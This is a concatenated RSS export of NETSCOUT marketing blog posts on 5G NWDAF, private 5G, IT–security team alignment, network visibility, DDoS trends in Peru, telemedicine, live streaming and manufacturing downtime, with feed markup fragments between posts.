<p>Instead, mobile operators will likely first spend time learning how to best use NWDAF analysis to improve the operational efficiency of the 5G SA network. Communication service providers (CSPs) will need to learn how to tune the AI algorithms within NWDAF to fit their business parameters and their level of comfort with using automated network configurations based on dynamic network or service conditions.</p>

<p><strong>What 5G Services Benefit from NWDAF?</strong></p>

<p>All 5G services will benefit from NWDAF, but low-latency network slices will need the most immediate real-time adjustments with live network operation. Early field trials and rollouts are projected to be Open RAN-related, with the core primary focus on low-latency optimization. Soon to follow are user experience analytics, especially in the areas of cloud gaming and virtual reality. Network slicing is still slow in coming to the carriers, but with it we expect that affected user experience detection/prediction cases will be important.</p>

<p>The key aspect is for CSPs to use the highest resolution of data—something that NETSCOUT provides off the wire, along with a flexible use case–driven AI/machine learning engine that can harness smart data into actionable results.</p>

<p><img alt="Automated Intelligence in NWDAF" data-entity-type="file" data-entity-uuid="eefd4e21-c082-4078-ade4-594cb0e7e5a8" src="http://localhost:7996/sites/default/files/inline-images/CS-099-EN-2101-WEB-02.png" /></p>

<p><i>Figure 2: Automated Intelligence in Omnis NWDAF</i></p>

<p>As 5G network functions increasingly use automation, many expect NWDAF will become essential to the operation of 5G networks in the near term. The implementation of closed-loop orchestration is not gated completely by the NWDAF specification. Automation in 5G networks will likely happen organically as well. Even today in non-5G networks, NETSCOUT data is a critical component for cell congestion and policy control.</p>

<p><strong>Significant Drivers for NWDAF</strong></p>

<p>Automation and closed-loop orchestration will likely happen with or without conformance to an industry specification. Large carriers that demand conformance to NWDAF specifications will likely be significant drivers for the adoption.</p>

<p>Vendors have also developed and delivered non-NWDAF solutions for network automation over the past few years. For example, NETSCOUT’s Adaptive Service Intelligence Smart Data has been used in many forms of automation that until now have not been given specific APIs and/or specifications.</p>

<p>The DAF standards are currently somewhat loosely defined, which is a good thing for NEMS and carriers getting started with closed-loop implementations. What is needed is not more definition in the standards, but rather real-world implementation of closed-loop orchestration use cases.</p>

<p>NWDAF is likely be a work in progress for the foreseeable future, as CSPs roll it out in multiple phases to give engineering and operations teams time to learn and gain confidence in how to best use this technology. Having a vendor-agnostic partner with cloud-optimized smart data will be indispensable in a multivendor implementation of NWDAF.</p>

  <content:encoded><![CDATA[<p>One thing network and security professionals can wholeheartedly agree on is that malicious attacks by bad actors are a constant threat. And defending against them isn’t simple. Attackers have access to a constantly <a href="https://www.netscout.com/blog/four-network-security-challenges-watch">expanding toolbox of innovative techniques</a>—and at the same time, the growth of cloud-based services and remote work has expanded the footprint of what security and network operations teams must safeguard.&nbsp; Clearly, <a href="https://www.netscout.com/blog/it-takes-two-tango">collaboration is a mission-critical imperative</a>.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=CIOs%20and%20CISOs%20are%20under%20increasing%20pressure%20to%20develop%20network%20security%20strategies%20that%20embrace%20common%20goals%20and%20collaborative%20processes.%20%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/add/blog#browser" rel="0" target="_blank">CIOs and CISOs are under increasing pressure to develop network security strategies that embrace common goals and collaborative processes. - Read more at @NETSCOUT</a><strong>Network Security Without Borders </strong></p>

<p>CIOs and CISOs are under increasing pressure to <a href="https://www.netscout.com/blog/network-protection-imperative">develop network security strategies</a> that embrace common goals and collaborative processes.</p>

<p>One important first step is to consider adopting a common network security technology stack that helps security and network operations teams work collaboratively. According to a recent white paper by Enterprise Strategy Group (ESG), such a technology stack should include the following:</p>

<p><strong>Stateless protection devices in front of stateful firewalls</strong>. CISOs should consider implementing stateless protection devices in front of stateful firewalls to help block threats such as command-and-control (C2) traffic, state-exhaustion distributed <a href="https://www.netscout.com/what-is-ddos">denial-of-service (DDoS)</a> attacks and known bad DNS domains. Such devices require timely and accurate threat intelligence that continually updates blocking lists in real time in order to be effective. Using these types of devices can help protect stateful network infrastructure, filter out known cyberattack traffic, and enable IT operations teams to maintain peak network performance for business requirements.</p>

<p>I<strong>DS/IPS technologies that examine all east/west traffic</strong>. Security experts have come to rely on next-generation firewalls for security at network perimeters. These firewalls cover network ingress/egress, but they leave internal networks open to attacks. To close this gap, network security needs to look at all east/west traffic traffic in their legacy networks and hybrid-cloud environments by using intrusion detection systems/intrusion protection systems (IDS/IPS) technologies. In this way, security teams can quickly and easily identify and filter out known threats moving laterally inside their environments to thwart a more serious event such as a data breach or ransomware attack.</p>

<p><strong>A common source for network and cloud visibility</strong>. Many network and security teams end up using a multitude of disparate tools to collect the same network data. Instead, what is needed is a common source of network truth. Teams should use line-rate packet acquisition, local storage of network metadata, and full packet capture to gain holistic network and cloud visibility. This is crucial for maintaining strong performance and detecting and responding to security incidents. The right tool will go beyond raw packet capture perform real-time packet analytics that create a robust set of locally stored, highly indexed metadata that can be quickly accessed and analyzed for more efficient incident detection, investigations, and mitigation.</p>

<p><strong>Network traffic analysis capabilities</strong>. To ensure network performance and security, teams need to understand network traffic patterns as well as the disposition of every device connected to the network before an incident occurs. In other words, a “shift-left” approach to incident response. This can help them identify and remediate rogue devices, misconfigurations, and vulnerable systems, while maintaining application performance for business operations. Network traffic analysis capabilities deliver end-to-end visibility that allows teams to monitor normal network behavior to identify anomalies that might impact network security or performance.</p>

<p><strong>Network detection and response systems</strong>. Modern-day bad actors increasingly deploy anti-detection and forensics techniques to avoid being detected by endpoint detection (EDR) solutions. However, these bad actors can’t hide on the network In addition to traffic analysis, teams need a way to analyze network data and threat intelligence in order to detect and investigate anomalous, suspicious, and malicious network activities that are hidden from other cybersecurity tools. Network detection and response systems can detect threats that EDR and log-based system miss, while providing access to a comprehensive source of metadata and network packets. This data is crucial for triage and investigations.</p>

<p>A network security-without-borders technology stack can absolutely improve threat prevention, detection, and response. At the same time, this smarter approach will enable Security Operations Center teams to extend the effectiveness of existing security-information and event-management systems as well as their security orchestration, automation, and response tools.</p>

  <title>Why Do IT and Cybersecurity Teams Struggle to Collaborate? </title>
  <link>http://localhost:7996/blog/why-do-it-and-cybersecurity-teams-struggle-collaborate</link>
  <description>The ability to meet the demands of today’s evolving work environment, while minimizing security risks, will depend on how well IT and security teams become fully aligned.</description>
  <content:encoded><![CDATA[<p><em>Part one of a two-part series</em></p>

<p><a href="https://www.netscout.com/blog/asert/our-new-ddos-normal-isnt-all-normal">Recent global cyberattacks</a> have provided a fresh reminder of the importance of ensuring organizations are defended against cyberthreats and that businesses are well prepared to respond to incidents. The risks aren’t new, but <a href="https://www.netscout.com/threatreport">they are growing more pervasive.</a> They threaten businesses, governments, and institutions of all sizes.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=However,%20the%20chief%20information%20officer%20(CIO)%20and%20the%20chief%20information%20security%20officer%20(CISO)%20often%20are%20given%20conflicting%20priorities%20and%20pressures,%20creating%20natural%20friction%20that%20can%20get%20in%20the%20way%20of%20such%20an%20integrated%20strategy.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/add/blog" rel="0" target="_blank">However, the chief information officer (CIO) and the chief information security officer (CISO) often are given conflicting priorities and pressures, creating natural friction that can get in the way of such an integrated strategy. - Read more at @NETSCOUT</a></p>

<p>As businesses roll out plans to balance the needs of employees returning to the office with those continuing to work from home, both the network operations and security operations teams face <a href="https://www.netscout.com/blog/four-network-security-challenges-watch">increasingly complex puzzles</a>. To solve them, many companies are asking those teams to work together to build a consistent and complete response to incidents and attacks. However, the chief information officer (CIO) and the chief information security officer (CISO) often are given conflicting priorities and pressures, creating natural friction that can get in the way of such an integrated strategy. In “<a href="https://vimeo.com/569934447">Aligning IT and Cybersecurity</a>,” a recent WSJ Pro Cybersecurity webinar sponsored by NETSCOUT, a panel of experts delved into the primary underlying factors.</p>

<p>“CISOs grapple with key decisions around data loss prevention, malware, antivirus, and encryption, and the administration of security controls and policies used to protect the business,” explained Mark Thomas, president of Escoute Consulting. “At the same time, CIOs are asked to ensure the performance of systems and services, and as a result may not prioritize security concerns. This may put their objectives at cross-purposes.”</p>

<p>The panelists noted several common points of friction between IT and security teams:</p>

<ol>
	<li><strong>New reporting structures.</strong> One of the most common reasons for friction between IT and security is changes in reporting structures. “Today, many CISOs no longer report to CIOs, instead having direct responsibility to CEOs and sometimes even the board of directors,” said Thomas. “While this change in reporting structure can be beneficial, it can also be a source of friction when CIOs and CISCOs have conflicting agendas.”</li>
	<li><strong>Budget battles.</strong> Another critical source of friction is the battle over budget. “The CIO’s role is to deliver services quickly and efficiently for the business, while the CISO’s role is to try and protect vital information,” added Vontage Senior Vice President Sanjay Macwan. “All too often, CIOs and CISOs are competing with each other for the same budget resources, pitting their respective interests against each other for finite funds.”</li>
	<li><strong>Compliance control.</strong> As organizations work to meet control requirements created by new rules and regulations, the question becomes, who owns the controls? As controls proliferate, ownership of those policies and procedures can become another point of friction between CIOs and CISOs. Again, the challenge here is effectively balancing performance and conformance—assuring efficiency, yet achieving security at the same time.</li>
</ol>

<p><strong>The Ripple Effect</strong></p>

<p>Ultimately, the lack of alignment between IT and security professionals can resonate far beyond the data center.</p>

<p>“The ability to meet the demands of today’s evolving work environment, while minimizing security risks, will depend largely on how well IT and security teams work together and become fully aligned,” concluded Okta CIO Alvina Antar. “By building stronger relationships between these teams, clarifying roles and responsibilities, CIOs and CISOs can reduce the friction, setting cybersecurity policies and implementing an IT strategy that achieves the mission-critical objectives of the organization.”</p>

<p>In our next post, we will continue this discussion, delving more deeply into ways CIOs and CISOs can work together to increase alignment for delivering much-needed performance and security.</p>

  <content:encoded><![CDATA[<p>What happens when your network is no longer yours?</p>

<p>Behind the scenes, and behind the screens, at companies large and small, your network is increasingly something that exists outside of your control. The systems that power corporate work have fundamentally changed, as existing trends toward mobile workforces, cloud-based SaaS applications and device flexibility have been accelerated by the global pandemic. “When you move applications to the cloud, you’re emulating a network. And it’s not your network. It’s the cloud provider’s network. It’s a virtual network where things are changing all the time,” says Jon Oltsik, senior principal analyst and ESG fellow at Enterprise Strategy Group. “That didn’t happen on a traditional network.”</p>

<p>In the current (and future) environment, the old guardrails—the physical walls of the office or the digital barriers of VPNs and firewalls—offer far less protection. According to NETSCOUT, a leading provider of network management and security tools, malicious events that overloaded VPNs and firewalls increased 21% from 2019 to 2020, as attackers targeted the growing remote workforce. Meanwhile, as threat surfaces expand and bad actors grow more sophisticated in their attacks, security increasingly depends on the ability to see inside these more complex, cloud-based networks. “It’s important that you have visibility on everything, especially as attacks generally start off looking like regular traffic or behavior from a user,” Oltsik says. “And then they slowly look at the network, get different credentials and do tremendous damage. You want to catch them early.”</p>

<h3 class="ns-h3">Meaningful Visibility</h3>

<p>Meaningful visibility is not simply a matter of seeing who is accessing the network and how. It’s an understanding of the interconnectedness of an enterprise’s complete digital infrastructure. It’s also an understanding of how different that looks today, compared to just a few years ago, when cloud solutions weren’t as dominant and remote work was less common. People inside the business don’t always understand the reach of their networks, what they have deployed, where they’re exposed or what their dependencies are, says Hardik Modi, area vice president of engineering, threat and mitigation products at NETSCOUT.</p>

<p><img alt="Circle diagram showing infrastructure providers in the middle, and data users and cyber threats on the outside" data-entity-type="file" data-entity-uuid="b37fe282-0f02-471b-b184-43d0d6755abf" loading="lazy" src="http://localhost:7996/sites/default/files/inline-images/NewNetwork_infographic_alt.png" /></p>

<p>“There’s any number of instances, for example, where the adversary knows to look for endpoint protection and turn it off, or find access through endpoints that might be less well protected, whether routers or IoT devices,” he says. According to NETSCOUT’s latest <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a>, an attacker can scan and compromise a new IoT device in five minutes or less.</p>

<p>Tools like NETSCOUT’s Smart Edge Protection technologies are designed to shine light on those risks by viewing data across physical, virtual and public cloud environments, analyzing traffic and using automation to identify risks and threats to the network. By focusing on the network itself, Modi says smart data tools can detect potential problems that endpoint security technologies on their own might miss. “Because we have the full fidelity, you can drill down and then you can zoom back out,” he says. “That allows us to give you really pervasive visibility.”</p>

<h3 class="ns-h3">Data, Forward</h3>

<p>In the face of expanding threat landscapes and emboldened attackers, enterprises must be constantly vigilant. How fast security software can act is critical. “Companies need to be proactive to mitigate known vulnerabilities and actively monitor all networks and systems to find intrusions as rapidly as possible,” says Curtis Franklin, senior analyst in cybersecurity at Omdia. “Dwell times—the length of time an intrusion is in a system before detection—remain very long, stretching for months and even years. Finding and remediating any suspicious activity is key to limiting the damage threat actors can do.”</p>

<blockquote class="blog-quote"><q>Because we have the full fidelity, you can drill down and then you can zoom back out. That allows us to give you really pervasive visibility.</q> <cite>Hardik Modi, Area Vice President of Engineering, Threat and Mitigation Products, NETSCOUT</cite></blockquote>

<p>And in today’s environment, Franklin says the good guys and the bad guys are using similar tools, like machine learning and artificial intelligence, which allow both sides to operate faster, without a need for consistent human intervention. “Threat actors use them to increase the effectiveness and lower the costs of their attacks, while defenders use them to separate noise from actual danger signals, responding to attacks more quickly than human analysts could,” he says. “Defenders, for example, use AI to defend against rapidly evolving threats that have not yet generated recognizable signatures, and attackers are using it to launch phishing attacks involving the same type of bot technology legitimate companies use to deliver customer service.”</p>

<p>Data can itself be a weapon against data, when used effectively. Better data results in better learning for the algorithms it trains, Modi says—and the ability to stay a step ahead in defending the networks of today. “If you can take trained, curated metadata, well-formatted and understood, and train your algorithms on that, you’re looking at a different set of outcomes,” he says. “The nature of data we’re extracting allows for better, enhanced outcomes using machine learning and data science.”</p>

<p>Tools like NETSCOUT’s Adaptive Service Intelligence, Modi says, are able to provide real-time insights and analytics from traffic data across all networks, whether on premises or in the cloud. And in the modern threat environment, enterprises can’t fall even a half-step behind. “There are motivated human adversaries, constantly looking for ways to negatively impact you using networks. They are where they are, you are where you are, and there’s a network that connects you,” Modi says. “That visibility has to enable the discovery of these systems, your core systems, and the relationships and dependencies between them. That is core to defending against intrusion.”</p>

  <title>Building a Healthy User Experience for Telemedicine </title>
  <link>http://localhost:7996/blog/building-healthy-user-experience-telemedicine</link>
  <description>Learn how one healthcare provider protected the performance and availability of its telemedicine application during the COVID-19 pandemic to assure a quality patient experience.</description>
  <content:encoded><![CDATA[<p>Amid the challenges of 2020, telemedicine emerged as a standout service. Patients seeking non-COVID-19 healthcare support turned to their computers and smart phones for online appointments when they couldn’t go to medical buildings and hospitals in the early days of the COVID-19 pandemic. According to reports by McKinsey &amp; Company, growth in the use of telemedicine services peaked in April 2020. Although that growth has since leveled off, McKinsey’s assessment shows telemedicine use rate remains approximately 38 times higher than it was before the pandemic. By any standard, this is a dramatic increase, making telemedicine applications a top priority for healthcare IT when it comes to assuring performance, availability, and patient experience.</p>

<p>The convenience of telemedicine for patients, combined with the ability for doctors to see and treat more patients in the same amount of time, has raised awareness and acceptance of telemedicine benefits over this last year and a half. However, the technology also brings new challenges. The inability to log into a session, choppy video, dropped calls, and other impairments can make telemedicine calls ineffective and impact the productivity of doctors, physicians’ assistants, and nurse practitioners. Combatting these issues and delivering a quality experience for all is a critical goal for healthcare IT organizations, particularly as the use of telehealth services continues to grow.</p>

  <title>Delivering High-Performance Applications with Private 5G Networks</title>
  <link>http://localhost:7996/blog/delivering-high-performance-applications-private-5g-networks</link>
  <description>To ensure deployments and business outcomes, enterprises must have visibility into critical private 5G service performance.</description>
  <content:encoded><![CDATA[<p><em>Authored by Matthias D’Autremont and John English</em></p>

<p>Communications service providers (CSPs) have been working to deliver high-performance applications with private 4G (LTE), but they have not been as successful as they will be with 5G. As it turns out, delivering high-performance applications through the disaggregation of public cloud could give them the keys to success. The advent of software-defined network (SDN) virtualization combined with orchestrated container-based micro services provides the ultimate deployment flexibility, scalability, and redundancy for private 5G.</p>

<p>Multi-access Edge Compute (MEC) decreases the distance—and therefore latency—between user equipment (UE) or IoT device and network application elements. For example, a normal 4G mobile communication signal will travel from the UE to the eNodeB and then on to the mobile core in about 100 ms. With 5G MEC, however, that communication is reduced to less than 10 ms.</p>

<p>MEC can be connected anywhere near the user or device as needed by the application, device, and service. Mobile devices are routed through the radio-access network (RAN) to the nearest edge compute location. Public cloud is being extended into the enterprise with cloud offerings such as AWS Wavelength, Outpost, and Azure Edge. Together, 5G and MEC are perfectly suited to deliver high-performance applications.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=To%20ensure%20successful%20deployments%20and%20business%20outcomes,%20enterprises%20must%20have%20visibility%20into%20critical%20private%205G%20service%20performance.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/add/blog#browser" rel="0" target="_blank">To ensure successful deployments and business outcomes, enterprises must have visibility into critical private 5G service performance. - Read more at @NETSCOUT</a></p>

<p>However, Private 5G as a new “edge” or network border means application tiers are spread across on-premises data centers, public cloud, and the MEC on physical and web-scale architectures, leading to an explosion in complexity. Lack of visibility for Operations and Engineering teams can lead to poor customer experience caused by slow or failing database queries, service-level agreement violations at the edge, or problems in the RAN, resulting in copious finger-pointing for mission-critical services. In a world of virtual or augmented reality, gaming, remote surgery, and other real-time services, a lag time of more than 50 ms is no longer acceptable. There’s also massive added complexity from the cloudification of the network and multi-tenancy options for network slicing.</p>

<p>To ensure successful deployments and business outcomes, enterprises must have visibility into critical private 5G service performance. Having a powerful and effective proactive monitoring and service triage solution is vital to delivering and maintaining the expected 5G service quality. This visibility gives IT Operations teams the confidence to launch new services with the ability to verify and monitor each enterprise site. Such smart data tools help IT easily and rapidly investigate service delivery issues with guided workflows and perform granular user session tracing and analysis for root cause.</p>

<p>Whether the private 5G network is located on-premises, off-premises, or a hybrid of those, having end-through-end service visibility is critical to assuring customer experience and monetizing subscriber behavior. This visibility continuously delivers timely and valuable insights across RAN, edge, and core, enabling users to explore real-time scenarios, create custom key performance indicators, and drive informed business decisions. Private 5G has the potential to transform the world as we know it. But the complexity multiplication truly requires Visibility Without Borders</p>

<p>Entitled “Network Security Without Borders: A Common Technology Stack for Network Security and Operations,” the study cites several factors that contribute to the growing challenge of network security:</p>

<p><strong>&nbsp;Increasingly sophisticated cyberthreat tools.</strong> Monitoring cyberthreats; correlating cyber threat intelligence with internal security telemetry; and keeping up with the tactics, techniques, and procedures used by adversaries is no easy proposition. The reality is, bad actors have an ever-growing array of innovative and complex tools at their disposal, including artificial intelligence. Meanwhile, targeted companies are often unfamiliar with the looming threats and have insufficient protections in place to mitigate the risk.</p>

<p><strong>Expanding attack surface.</strong> With an increasing number of components such as work-from-home users, mobile devices, sanctioned/unsanctioned cloud applications, and Internet of Things (IoT) devices, enterprised must defend a continually growing attack surface. This puts the onus on security teams to know what’s connected to the network, scan for vulnerable assets, monitor network traffic, and fine-tune security controls.</p>

<p><strong>Increasingly complex network security technology</strong>. The ESG paper noted that one-third of security professionals believe that network security has become more difficult because of an increase in the number of disparate network security tools required to address different threat vectors and use cases. With a growing attack surface, deploying, configuring, and operating an assortment of network security point tools will only become more cumbersome.</p>

<p><strong>Cybersecurity skills shortages. </strong>According to the ESG study, 23 percent of IT security departments are understaffed. These departments tend to be overwhelmed by the scope and complexity of cybersecurity.</p>

<p><strong>We Have Met the Enemy, and It is Us</strong></p>

<p>These four challenges add to an already difficult job, as differing goals and objectives often hinder the ability of network security and IT operations teams to collaborate and communicate closely. Network teams typically focus on availability and mean-time-between-failure, while security targets visibility and mean-time-to-detect, mean-time-to-respond, and mean-time-to-acknowledge. Metrics. This tends to create greater friction and finger-pointing instead of collaboration and cooperation. Unless the right controls are put in place, both groups may end up working at cross-purposes. And because security and network operations teams tend to rely on manual processes, handoffs and process management may be cumbersome and ineffective.</p>

<p>Moreover, IT and security teams frequently work with different tools and rely on separate data as their sources of truth. As a result, IT and security teams end up with differing views of network reality, which leaves each group missing critical insights needed to keep the network secure and running at peak performance.</p>

<p>To ensure the success of both security and operations, enterprises need to address the friction between the two groups. This means ensuring they have consistent goals, unified processes, and common/interoperable technologies, so they can work together in harmony. In the second blog of this series, we’ll dive into how to build a common “network security without borders” technology stack that works for both teams.</p>

  <title>Peru Under Attack</title>
  <link>http://localhost:7996/blog/peru-under-attack</link>
  <description>A year in review: Detailed DDoS attack data for Peru</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our weekly series focuses on DDoS activity in specific countries. This week: <a href="https://www.netscout.com/sites/default/files/2021-04/TR2H2020_LATAM_Peru.pdf">Peru.</a></p>

  <title>Private 5G is Here, Are You Ready?</title>
  <link>http://localhost:7996/blog/private-5g-is-here</link>
  <description>Private #5G deployments are on the rise across many industries--are they right for you?</description>
  <content:encoded><![CDATA[<p><em>By Matthias D’Autremont and John English</em></p>

<p>Currently, more than 69 countries have deployed 5G commercially, while 500 private<a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="b9a4e859-a7e4-4e0e-b9e9-0009fbbbd739" href="http://localhost:7996/node/57406"> 5G/LTE networks</a> have been implemented—a number that is growing rapidly. Fueling the growth of 5G private networks is the availability of 4 times more licensed (radio) spectrum and 15 times more unlicensed spectrum. The cumulative spending on 5G is expected to reach $9 billion by 2025, enabling enterprises to add $8 trillion to the global economy in doing so. Of the projected 14,000 total 5G private networks, 40 percent are expected to be for small and medium businesses by 2025.</p>

<p><strong>Why Do We Need Private 5G?</strong></p>

<p>Private 5G is not your father’s mobile network. Indeed, 5G is to businesses what 4G or 3G mobile networks were to consumers. Enterprises will not likely replace WiFi with 5G in “carpeted areas,” but rather will deploy it as a complementary solution in areas where there is a need for broader coverage or more mobility, or where device density or signal interference is an issue. Indeed, WiFi and cable replacement is a fast-growing category because of 5G’s relative cost, flexibility, quality of service, and strong security capabilities. Hundreds of entities are acquiring priority access licenses for Citizens Broadband Radio Service to build private 5G networks for many industries, such as smart factories of the future where the only things that don’t move are the roofs and the walls.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=Private%205G%20is%20not%20your%20father%E2%80%99s%20mobile%20network.%20Indeed,%205G%20is%20to%20businesses%20what%204G%20or%203G%20mobile%20networks%20were%20to%20consumers.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/90891" rel="0" target="_blank">Private 5G is not your father’s mobile network. Indeed, 5G is to businesses what 4G or 3G mobile networks were to consumers. - Read more at @NETSCOUT</a>Not only does private 5G also enable new opportunities for remote control in construction and for related autonomous vehicles, but it also can drive the reinvention of business models that have been static for decades. Think, for example of utilities building private 5G networks with smart meters and wireless sensors that protect their electric grids, or transmission towers that double as weather towers with live stream video.</p>

<p>Then there are 5G-driven productivity gains, such as enabling AR/VR usage for field technicians. Recently, Lufthansa noted that their ability to use 5G for remote aircraft diagnostics was a vital reason that the company could operate during the pandemic!</p>

<p>There are many more private 5G categories and use cases such as airports, transportation, stadiums, smart warehouses, and military, which are all being transformed by private 5G networks.</p>

<p><strong>What Makes Private 5G Different?</strong></p>

<p>The key enabling technologies of 5G have been well-advertised:</p>

<ul>
	<li>Ultra-Reliable Low-Latency Communication (URLLC)</li>
	<li>Enhanced Mobile Broadband (EMBB)</li>
	<li>Massive IoT (MIoT).</li>
</ul>

<p>What does this look like in action? Let’s look at a couple of examples:</p>

<p><img alt="autonomous car graphic" data-entity-type="file" data-entity-uuid="3cfaf8c4-7dc8-4a13-b4cd-6b5bff572b22" src="http://localhost:7996/sites/default/files/inline-images/CS-089-EN-2102-WEB.png" /></p>

<p><img alt="​​​​Autonomous Car Graphic" data-entity-type="file" data-entity-uuid="10283506-0c97-4072-a2ce-a503fb9a9b0d" src="http://localhost:7996/sites/default/files/inline-images/CS-088-EN-2101-WEB.png" /></p>

<p>Looks like we may need more popcorn in the future!</p>

<p>Moreover, massive advancement in device densification enabled by massive IoT, MIMO, beam forming, SON, carrier aggregation, small cells, and Open RAN/Virtual RAN lets 5G support 10 times more services while consuming far less power than 4G. (It also enables many new IoT use cases.) Another key to private 5G business enablement is network slicing, which essentially enables 5G LANs or WANs which creates a true multi-tenant network.</p>

<p><strong>Flexibility of Private 5G Networks</strong></p>

<p>There are many potential deployment scenarios and permutations for enterprise 5G, but they all fall into either a private or public category. For example, if an enterprise needs guaranteed quality of service and exceptional data privacy and security, they may opt for a completely private on-site design, leasing unlicensed or licensed spectrum from a mobile operator. The 5G small cells, 5G core, and multi-access edge computing (MEC) can all be on-site. If they have the knowledge and expertise, companies can choose to build and manage the network in-house, or they can partner with a systems integrator, network equipment provider, or mobile operator.<img alt="autonomous car graphic" data-entity-type="file" data-entity-uuid="3455b258-10f8-4620-b90b-30efe936ad43" src="http://localhost:7996/sites/default/files/inline-images/CS-090-EN-2101-WEB.png" /></p>

<p>On the other hand, if enterprises need lower cost 5G solutions that can be operational quickly but still deliver low latency and good security, they may opt for a hybrid approach that uses 5G network slicing to leverage the mobile operator’s RAN or the entire mobile operator network. They can still leverage small cells on-premises for coverage, while the edge/MEC could be on-premises, hosted, or in the cloud.</p>

<p>While<a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="c4b4ea7d-1daf-47fb-8e82-fdc24f0eed3d" href="http://localhost:7996/node/89231"> 5G network slicing</a> is still in its infancy, communication service providers are likely starting with a handful of fixed slices for applications that require URLL and EMBB, massive IoT, gaming, and video. But in a few years, network slices will be orchestrated in near real-time down to the individual enterprise level. If successful, 5G slices may eventually be as common as network domain names! It’s also possible to achieve many of the same goals of 5G slicing now, through a distributed small cell or <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="b2144bec-a5f6-46ce-8ef8-baa9e0600aa8" href="http://localhost:7996/node/89236">Open RAN</a> architecture, which is less complicated than network slicing.</p>

<p>The bottom line: there are a myriad of 5G private network deployment options to fit virtually every application, budget, operational skillset and data security requirements.</p>

  <content:encoded><![CDATA[<p>The global pandemic had a commercially disastrous effect on the entertainment industry, with media coverage chronicling declines in cinema, theater, concert, and other live-event businesses worldwide. In several of these sectors, government assistance was the only lifeline keeping some businesses on autopilot until the social distancing effects associated with COVID-19 began to diminish and in-person attendance resumed.</p>

<p>In that the same 18-month timeframe, however, there was explosive growth in the global live video streaming business. Looking at recent trend analysis, some reports estimate this market will grow to more than $800 billion by 2027. In sports entertainment, for example, the restrictions on live-event presentation are driving many leagues and organizations to advance a digital-first, direct-to-fan event model, with the end goal of bringing subscribers “closer to the action” without the necessity of in-person attendance. This model envisions customer experience enhancements that include advanced replay options, real-time statistics, and live chat.</p>

<p>With live attendance at stadiums or arenas still not in play for many teams’ devoted followers, perhaps an increasingly personalized, high-quality, real-time game presentation is a next-best option, all without leaving the comforts of home.</p>

<p>This expanding market is offering opportunities to long-established broadcast platforms as well as to new video streaming industry players. Regardless of the event type or platform, however, the ability to consistently deliver on the promise of high-quality live streaming video is what will differentiate providers and their abilities to retain subscribers in this market, and that translates to presentations free from unified communications (UC) impairments such as jitter, latency, or packet loss.</p>

<p>For one internationally recognized media company, NETSCOUT offered an unmatched, integrated approach for live streaming video assurance and network traffic packet capture that leveraged our “event site to co-located” visibility, 100GB network speed support, and UC analytics for MPEG transport stream (MPEG-TS) formats.</p>

  <title>Beating the High Cost of Manufacturing Downtime</title>
  <link>http://localhost:7996/blog/beating-high-cost-manufacturing-downtime</link>
  <description>Global heavy-equipment manufacturer minimizes downtime by using NETSCOUT Smart Edge Monitoring to gain visibility into production applications used in the factory and hosted in the data center.</description>
  <content:encoded><![CDATA[<p>All manufacturers experience downtime, typically in the range of 5 to 20 percent. Downtime can affect an entire factory, or just a portion of the assembly line or a piece of manufacturing equipment. And while Industrial Internet of Things (IIoT) adoption has improved productivity in many manufacturing environments, it also increases the risk of downtime.</p>

<p>From an information technology (IT) perspective, planned outages, maintenance, upgrades, and updates account for some productivity disruptions. It is the unplanned IT-related outages that present the real challenges to an organization.</p>

<p>Many factors play into the impact of such unplanned outages:</p>

<ul>
	<li><strong>Frequency of incidents</strong>—for example, weekly versus monthly</li>
	<li><strong>Length of the disruptions</strong>—minutes to hours to days, for example</li>
	<li><strong>Breadth of the degradations</strong>, such as one machine on the automated assembly line versus the full assembly line itself or the WAN connection to the data center that sends communications to the assembly line</li>
	<li><strong>Type of manufacturing the plant is involved in</strong>, such as parts production needed to complete assembly in other factories, assembly for final goods, inventory for revenue, custom order completion for direct customers, employee productivity, and vendor productivity (transportation of materials in the next stage of a process, for example)</li>
	<li><strong>Type of industry</strong>, such as perishable foods versus high-tech equipment versus pharmaceutical manufacturing</li>
</ul>

<p>No one seems to be immune to this problem: A frequently referenced Aberdeen study indicates that <a href="https://iiot-world.com/predictive-maintenance/the-actual-cost-of-downtime-in-the-manufacturing-industry/">82 percent of respondents</a> reported that they had grappled with unplanned downtime within the previous three years of the study. Not surprisingly, the more frequent the outages and the longer they take to rectify and restore to operations, the greater the negative financial impact to the organizations. Ultimately, the tangible costs of manufacturing downtime range from thousands of dollars per hour to thousands of dollars per minute. Consider some specific industries and their cost of unplanned downtime:</p>

<ul>
	<li><a href="https://blog.worximity.com/en/industry-4_0/not-connected-yet-monitor-the-cost-of-downtime-in-food-beverage-industry">Food and beverage industry</a>: Up to $30,000 per hour</li>
	<li><a href="https://www.foodqualityandsafety.com/article/motors-help-baking-equipment-reduce-factory-downtime/">Bakeries</a>: As much as $9,000 per hour, per line</li>
	<li><a href="https://denisontechnologies.com/pharmaceutical-industry-focusing-on-power-quality-can-reduce-downtime-20-percent/">Pharmaceutical industry</a>: Between $100,000 and $500,000 per hour of downtime</li>
	<li><a href="https://www.simutechmultimedia.com/the-true-cost-of-downtime-what-you-dont-know-about-how-downtime-affects-your-productivity/">Automotive industry</a>: Can range between $22,000 and $50,000 per minute</li>
	<li><a href="https://linchpinseo.com/trends-in-the-electronics-manufacturing-equipment-industry/">Electronic manufacturing</a>: $100,000 or more per hour</li>
</ul>

